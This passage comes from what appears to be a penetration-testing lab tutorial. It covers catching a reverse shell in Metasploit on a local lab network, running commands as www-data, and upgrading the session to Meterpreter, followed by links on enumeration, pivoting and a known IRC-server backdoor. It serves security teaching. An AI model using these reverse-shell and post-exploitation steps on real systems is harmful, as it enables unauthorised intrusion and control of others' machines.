If you switch back to your reverse shell in Metasploit, you should see a new connection.
Try running a command such as id:

```
[*] Started reverse TCP handler on 172.17.0.1:1337 
[*] Command shell session 1 opened (172.17.0.1:1337 -> 172.17.0.2:60084) at 2023-12-28 20:55:33 -0500

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Upgrading to a Meterpreter session

To upgrade your basic generic TCP reverse shell to a Meterpreter shell, press Ctrl+Z to send that session to the background.
Then run the session upgrade command on the session you earlier opened:

```
msf6 exploit(multi/handler) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 172.17.0.1:4433 
[*] Sending stage (1017704 bytes) to 172.17.0.2
[*] Meterpreter session 2 opened (172.17.0.1:4433 -> 172.17.0.2:48016) at 2023-12-28 20:56:25 -0500
[*] Command stager progress: 100.00% (773/773 bytes)
```

Now you've upgraded your puny shell to a glorious Meterpreter session.
To get into Meterpreter, open your new session:

```
msf6 exploit(multi/handler) > sessions -i 3
[*] Starting interaction with 3...

meterpreter >
```

# Extra Resources

Here are some extra reading materials I've prepared for the exposed services in case you're interested or stuck:

- [Nmap](reconnaissance.md#nmap)
- [Scanning Websites](reconnaissance.md#automated-web-application-scanners)
- [Path Enumeration](reconnaissance.md#path-enumeration)
- [SMB Enumeration](reconnaissance.md#smb-enumeration)
- [NFS Enumeration](reconnaissance.md#nfs-enumeration)
- [FTP Enumeration](reconnaissance.md#ftp-enumeration)
- [SMTP Enumeration](reconnaissance.md#smtp-enumeration)
- [SNMP Enumeration](reconnaissance.md#snmp-enumeration)
- [WebDAV Enumeration](reconnaissance.md#webdav-enumeration)

As well as some links I found useful:

- [Custom Host Discovery Scans](https://nmap.org/book/man-host-discovery.html)
- [Autoroute, SOCKS, and Proxychains4](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [Reverse Shells (OpenBSD and more)](https://kb.systemoverlord.com/security/postex/reverse/)
- [Upgrading a shell to Meterpreter](https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html)
- [UnrealIRC Backdoor](https://pentesthacker.wordpress.com/2021/01/10/hack-metasploitable-with-unrealirc-backdoor/)
- [Reverse Shell through a Pivot](https://pwn.no0.be/post/windows/pivoting/)

- [Metasploitable2 Walkthrough](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/)
- [Metasploitable3 Walkthrough](https://stuffwithaurum.com/2020/04/17/metasploitable-3-linux-an-exploitation-guide/)
- [Hackazon Walkthrough](https://docs.rapid7.com/appspider/conducting-a-basic-test-manually-against-hackazon/)